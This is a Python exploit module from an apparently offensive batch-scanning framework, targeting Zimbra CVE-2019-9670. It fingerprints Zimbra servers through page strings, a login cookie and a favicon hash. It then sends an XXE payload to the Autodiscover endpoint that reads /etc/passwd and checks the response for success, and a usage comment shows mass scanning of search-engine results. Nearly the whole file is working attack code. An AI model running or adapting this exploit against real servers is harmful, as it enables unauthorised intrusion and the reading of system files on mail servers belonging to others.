# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-09 2:18

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *


# python3 batch.py -m exploit.scripts.Zimbra.CVE-2019-9670 -cs -fs "app=\"zimbra-邮件系统\""

class Script(BaseScript):
    name = 'Zimbra'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.RCE
        # 编号
        self.bug_number = 'CVE-2019-9670'
        # 来源
        self.bug_refer = 'http://www.rapid7.com/db/modules/exploit/linux/http/zimbra_xxe_rce'
        # 特定路径判断
        self.detect_path_list = []
        # exec
        self.exec_path_list = ['/Autodiscover/Autodiscover.xml']
        # 相关信息
        self.info = 'Version <= 8.7.0 and 8.7.11'
        # favicon
        self.favicon_md5_list = ['8c7d1c14e4b9c42f07bd6b800d93b806']

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            url = f'http://{self.target}/' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/'
            async with session.get(url=url, headers=self.headers, timeout=self.req_timeout, verify_ssl=False) as response:
                if response is not None:
                    await asyncio.sleep(2)
                    text = await response.text()
                    if text is not None and ('window._zimbramail' in text or 'content="zimbra' in text or 'typeof poppedwindow' in text):
                        self.flag = True
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                        return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}
                    if response.headers.get('Set-Cookie', '') and 'ZM_LOGIN_CSRF' in response.headers.get('Set_Cookie', '') and 'ImgZimbraIcon' in text:
                        self.flag = True
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                        return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}
            url = f'http://{self.target}/img/logo/favicon.ico' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/img/logo/favicon.ico'
            favicon_md5 = await AsyncFetcher.get_favicon_md5_fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
            if favicon_md5 in self.favicon_md5_list:
                self.flag = True
                gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'application/xml'})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                data = '''<!DOCTYPE xxe [
                    <!ELEMENT name ANY >
                    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
                     <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
                        <Request>
                          <EMailAddress>aaaaa</EMailAddress>
                          <AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
                        </Request>
                      </Autodiscover>'''
                text = await AsyncFetcher.post_fetch(session=session, url=url, headers=headers, data=data, allow_redirects=False)
                if 'root:x' in text or 'Problem accessing' in text:
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                    return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass
